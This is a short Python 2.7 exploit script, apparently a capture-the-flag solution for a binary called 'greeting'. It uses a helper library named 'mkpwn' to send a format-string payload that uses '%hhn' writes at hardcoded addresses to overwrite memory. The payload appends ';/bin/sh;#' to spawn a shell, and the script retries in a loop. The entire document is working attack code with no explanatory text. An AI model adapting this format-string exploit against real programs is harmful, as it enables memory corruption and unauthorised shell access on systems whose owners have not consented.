#!/usr/bin/env python2.7
# -*- coding:utf-8 -*-
from mkpwn import *

LOCAL = True
DEBUG = True

# global

# exp

def get_io():
    if LOCAL:
        target  = './greeting'
    else:
        target  = ('0', 0)

    global io
    io  = mk(target, DEBUG)

def exp():
    io.ru('name...')
    io.gdb_hint([0x804864F, 0x80485A0])

    payload  = 'AA'
    #payload += l32(0xffce298c) + l32(0x8049a40)
    payload += l32(0xffffd8bc) + l32(0x8049a40)
    payload += '%{}$hhn'.format(0xc)
    payload += '%0{}x'.format(0x90 - 0x1c)
    payload += '%{}$hhn'.format(0xd)
    payload += ';/bin/sh;#'
    io.pr(payload)

    #io.ru('Nice')

    io.interact()

# main
if __name__ == '__main__':
    while True:
        get_io()
        try:
            exp()
        except Exception as e:
            print e
        io.close()
